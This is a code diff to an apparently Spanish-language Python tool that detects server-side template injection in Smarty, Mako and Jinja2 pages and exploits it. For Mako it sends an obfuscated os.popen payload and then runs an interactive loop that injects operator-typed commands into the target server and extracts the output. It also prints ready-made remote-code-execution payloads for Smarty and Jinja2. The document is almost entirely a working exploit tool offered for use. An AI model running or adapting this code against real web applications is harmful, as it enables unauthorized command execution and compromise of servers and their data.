@@ -29,6 +29,36 @@ def discover_inputs(url):
 def send(url, param, payload):
     return requests.get(url, params={param: payload}, timeout=TIMEOUT)
 
+def extract_output(html, skip_uid=False):
+    soup = BeautifulSoup(html, "html.parser")
+
+    for td in soup.find_all("td"):
+        text = td.get_text(strip=True)
+        if not text:
+            continue
+
+        if text.startswith("uid="):
+            if skip_uid:
+                continue
+            return text
+
+        if all(ord(c) < 128 for c in text):
+            return text
+
+    return None
+
+def strip_first_id(output):
+    if not output:
+        return output
+
+    lines = [l for l in output.splitlines() if l.strip()]
+
+    if lines and lines[0].startswith("uid="):
+        lines = lines[1:]
+
+    return "\n".join(lines) if lines else None
+
+
 def test_ssti(url):
     print(f"[*] Testing {url}\n")
 
@@ -45,8 +75,8 @@ def test_ssti(url):
 
             r = send(action, param, "azbhvjsisdawdsa{*comment*}asdjsdfhmsdfasd")
             if "azbhvjsisdawdsaasdjsdfhmsdfasd" in r.text and "comment" not in r.text:
-                print(f"[+] SSTI Smarty")
-                print("Pruebe {{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}} y vea el resultado obtenido.")
+                print("[+] SSTI Smarty")
+                print("Pruebe {{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}")
                 return
 
             marker = "aazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsajazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsafazbhvjsisdawdsahazbhvjsisdawdsamazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsafazbhvjsisdawdsaaazbhvjsisdawdsasazbhvjsisdawdsad"
@@ -54,43 +84,46 @@ def test_ssti(url):
             r = send(action, param, '${"azbhvjsisdawdsa".join("asdjsdfhmsdfasd")}')
             if marker in r.text:
                 print("[+] SSTI Mako")
-                decision = input("Desea continuar y explotar el sistema verificando el comando 'id' introducido a traves de un payload predefinido (s/n): ")
+
+                decision = input("Desea continuar y explotar el sistema verificando el comando 'id' (s/n): ")
                 if decision.lower() != "s":
                     return
+
                 clear()
-                context = {
-                    "action": action,
-                    "param": param,
-                }
+                context = {"action": action, "param": param}
+
                 r2 = send(
                     context["action"],
                     context["param"],
                     '${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}'
                 )
 
-                print("[i] Output Payload '${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}' = id: ", r2.text)
+                output = extract_output(r2.text)
+                print("[i] Output comando id:")
+                print(output if output else "[!] No se pudo extraer el output")
+
                 while True:
-                    comando = str(input("Introduzca el comando que desea ejecutar para ver su resultado: "))
+                    comando = input("Introduzca el comando que desea ejecutar: ")
                     clear()
-                    char = "'"
-                    payload2 = "${self.module.cache.util.os.popen(" + char + "id && " + comando + char + ").read()}"
-                    r2 = send(
-                        context["action"],
-                        context["param"],
-                        payload2
-                    )
-                    print("[i] Output Payload id && ", payload2, ":", r2.text)
-                    print(f"Busque en el output recibido el resultado del payload ejecutado.")
+ 
+                    payload2 = "${self.module.cache.util.os.popen('id && " + comando + "').read()}"
+                    r2 = send(context["action"], context["param"], payload2)
+
+                    output = extract_output(r2.text)
+                    output = strip_first_id(output)
+
+                    print("[i] Output comando:")
+                    print(output if output else "[!] No se pudo extraer el output")
+
                 return
-        
+
             r = send(action, param, "${{1348*6324}}")
             if "8524752" in r.text:
-                print(f"[+] SSTI Jinja2")
-                print("Pruebe {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}} y vea el resultado obtenido.")
+                print("[+] SSTI Jinja2")
+                print("Pruebe {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}")
                 return
 
     print("[-] No SSTI detectada")
-    print(r.text)
 
 if __name__ == "__main__":
     test_ssti(input("URL: "))
